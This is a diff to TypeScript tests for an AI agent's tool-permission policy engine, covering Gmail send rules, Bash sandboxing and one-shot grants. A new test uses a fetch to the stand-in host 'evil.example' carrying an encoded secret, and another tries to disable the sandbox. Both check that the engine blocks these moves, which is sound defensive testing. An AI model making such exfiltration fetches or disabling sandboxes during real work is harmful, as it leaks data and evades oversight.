@@ -305,7 +305,7 @@ const rows: Row[] = [
     tool: SEND,
     input: MAIL,
     expected: (ids) => ({
-      ...allowed('EXTERNAL', 'Allowed by a standing rule', null),
+      ...allowed('EXTERNAL', 'Allowed by a standing rule', SEND),
       ruleId: ids.allow,
     }),
   },
@@ -313,7 +313,7 @@ const rows: Row[] = [
     scenario: 'EXTERNAL + allow rule with matching inputMatch → allow',
     setup: (h) =>
       h.rule('allow', {
-        toolPattern: 'mcp__gmail__*',
+        toolPattern: 'mcp__gmail__send*',
         effect: 'allow',
         inputMatch: { to: '*@mycompany.com' },
       }),
@@ -376,7 +376,7 @@ const rows: Row[] = [
     setup: (h) => {
       h.rule('allow', { toolPattern: SEND, effect: 'allow' });
       h.rule('deny', {
-        toolPattern: 'mcp__gmail__*',
+        toolPattern: 'mcp__gmail__send*',
         effect: 'deny',
         reason: 'No mail from this Bot',
       });
@@ -450,7 +450,7 @@ const rows: Row[] = [
     tool: 'Bash',
     input: { command: 'ls' },
     ctx: { shellContained: true },
-    expected: () => allowed('WRITE_LOCAL', 'Local change inside the sandbox'),
+    expected: () => allowed('WRITE_LOCAL', 'Local change inside the sandbox', 'Bash'),
   },
   {
     scenario: 'Bash not contained + allow rule + tainted → ask',
@@ -507,7 +507,7 @@ describe('PolicyEngine.evaluate with one-shot grants', () => {
       ruleId: null,
       approvalId: h.ids.a,
       updatedInput: null,
-      untrustedSource: null,
+      untrustedSource: SEND,
       reason: 'Approved by owner',
     });
     expect(h.evaluate(SEND, MAIL)).toMatchObject({ decision: 'ask', tier: 'EXTERNAL' });
@@ -624,5 +624,29 @@ describe('PolicyEngine.evaluate with one-shot grants', () => {
       reason: UNTRUSTED,
     });
     expect(h.evaluate(SEND, other, { botId: 'bot_2' })).toMatchObject({ decision: 'ask' });
+  });
+});
+
+describe('PolicyEngine: review hardening (M2 review H1/H2)', () => {
+  it('asks before WebFetch/WebSearch in a tainted Run, allows them otherwise', () => {
+    const h = harness();
+    for (const tool of ['WebFetch', 'WebSearch']) {
+      expect(
+        h.evaluate(tool, { url: 'https://evil.example/?d=c2VjcmV0' }, { tainted: true }).decision,
+      ).toBe('ask');
+      expect(h.evaluate(tool, { url: 'https://example.com' }, { tainted: false }).decision).toBe(
+        'allow',
+      );
+    }
+  });
+
+  it('never allows disabling the engine sandbox', () => {
+    const h = harness();
+    const out = h.evaluate(
+      'Bash',
+      { command: 'ls', dangerouslyDisableSandbox: true },
+      { shellContained: true },
+    );
+    expect(out.decision).toBe('deny');
   });
 });
